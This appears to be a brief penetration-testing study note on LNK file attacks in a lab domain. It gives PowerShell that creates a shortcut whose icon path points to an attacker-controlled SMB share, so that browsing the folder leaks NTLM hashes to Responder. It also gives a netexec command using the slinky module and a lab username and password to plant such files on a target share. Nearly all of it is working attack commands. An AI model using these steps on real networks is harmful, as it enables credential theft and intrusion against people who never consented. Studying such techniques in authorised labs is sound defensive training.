### LNK File Attacks

Run PowerShell in Admin and create a file in this fashion  

`$objShell = New-Object -ComObject WScript.shell`  
`$lnk = $objShell.CreateShortcut("C:\test.lnk")`  
`$lnk.TargetPath = "\\192.168.138.149\@test.png"`  The IP here is the IP of your attack machine  
`$lnk.WindowStyle = 1`  
`$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"`  
`$lnk.Description = "Test"`  
`$lnk.HotKey = "Ctrl+Alt+T"`  
`$lnk.Save()`  

This actually misuses the icon in file explorer by forcing it to try and reach out to a share drive to get the icon image.  When you have responder running, this is just like connecting to a share drive.  This means the file needs to be as high on the list as possible so the icon is loaded

`netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`  
This netexec/CME tool will also do the same thing.  Server is the attacker IP, name is the name of the file, the Module is slinky
